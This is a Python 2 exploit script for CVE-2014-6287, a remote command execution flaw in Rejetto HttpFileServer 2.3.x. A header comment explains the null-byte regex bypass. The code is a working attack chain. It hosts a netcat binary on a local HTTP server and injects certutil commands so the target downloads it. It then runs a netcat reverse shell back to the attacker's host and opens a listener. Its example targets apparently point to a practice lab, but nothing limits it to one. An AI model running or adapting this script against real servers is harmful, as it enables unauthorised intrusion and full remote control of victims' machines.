#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ###############################################################################################
# █▄▄▄▄ ▄███▄    ▄▄▄▄▄ ▄███▄     ▄▄▄▄▀ ████▄  ▄  █    ▄▄▄▄▀ ▄▄▄▄▀ █ ▄▄  █▄▄▄▄ ▄█▄    ▄███▄                             #
# █  ▄▀ █▀   ▀ ▄▀  █   █▀   ▀ ▀▀▀ █    █   █ █   █ ▀▀▀ █ ▀▀▀ █    █   █ █  ▄▀ █▀ ▀▄  █▀   ▀                            #
# █▀▀▌  ██▄▄       █   ██▄▄       █    █   █ ██▀▀█     █     █    █▀▀▀  █▀▀▌  █   ▀  ██▄▄                              #
# █  █  █▄   ▄▀ ▄ █    █▄   ▄▀   █     ▀████ █   █    █     █     █     █  █  █▄  ▄▀ █▄   ▄▀                           #
# █   ▀███▀    ▀     ▀███▀    ▀               █    ▀     ▀       █      █   ▀███▀  ▀███▀                               #
# ▀                                           ▀                    ▀    ▀                                              #
# DATE                                                                                                                 #
# 26/07/2019                                                                                                           #
#                                                                                                                      #
# DESCRIPTION                                                                                                          #
# CVE-2014-6287 - HttpFileServer 2.3.x Remote Command Execution                                                        #
#                                                                                                                      #
# issue exists due to a poor regex in the file ParserLib.pas                                                           #
# function findMacroMarker(s:string; ofs:integer=1):integer;                                                           #
# begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;                                                         #
#                                                                                                                      #
# it will not handle null byte so a request to                                                                         #
# http://localhost:80/?search=%00{.exec|cmd.}                                                                          #
# will stop regex from parse macro , and macro will be executed and remote code injection happen.                      #
#                                                                                                                      #
# nighter - http://nighter.se/                                                                                         #
#                                                                                                                      #
########################################################################################################################

import SimpleHTTPServer
import SocketServer
import signal
import os
import time
import urllib2
import sys
import urllib as ul;

from multiprocessing import Process

# chdir to script working directory
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def prepare_payload():

    if os.path.isfile('./.nc.exe') is False:
        print("[-] netcat payload not found.")
        sys.exit(0)

    os.system('cp ./.nc.exe /tmp/nc.exe 2>/dev/null')
    if os.path.isfile('/tmp/nc.exe') is False:
        print("[-] prepare netcat payload failed.")
        sys.exit(0)

def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def rce_exec(cmd):

    payload = ul.quote_plus(cmd)
    urllib2.urlopen(HOST + '/?search=%00{.+exec|' + payload + '.}')


def exploit():

    time.sleep(5)

    cmd = 'certutil.exe -urlcache -split -f http://' + LHOST + ':8000/nc.exe'
    rce_exec(cmd)

    time.sleep(3)

    rce_exec('rename Blob0_0.bin nc.exe')
    time.sleep(3)

    cmd = 'nc.exe %s %s -e c:\windows\system32\cmd.exe' % (LHOST, LPORT)
    rce_exec(cmd)

if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
█▄▄▄▄ ▄███▄    ▄▄▄▄▄ ▄███▄     ▄▄▄▄▀ ████▄  ▄  █    ▄▄▄▄▀ ▄▄▄▄▀ █ ▄▄  █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀ ▄▀  █   █▀   ▀ ▀▀▀ █    █   █ █   █ ▀▀▀ █ ▀▀▀ █    █   █ █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄       █   ██▄▄       █    █   █ ██▀▀█     █     █    █▀▀▀  █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ ▄ █    █▄   ▄▀   █     ▀████ █   █    █     █     █     █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀    ▀     ▀███▀    ▀               █    ▀     ▀       █      █   ▀███▀  ▀███▀   
 ▀                                           ▀                    ▀    ▀                   
[windowsXP version without powershell]
    """)
        print("Usage: %s <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("\nEXAMPLE: ./rejetto_http_rce.py http://10.10.10.59:9505 10.10.14.24 1337\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)

    prepare_payload()

    # Serve payload
    p = Process(target=HttpListener)
    p.start()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)
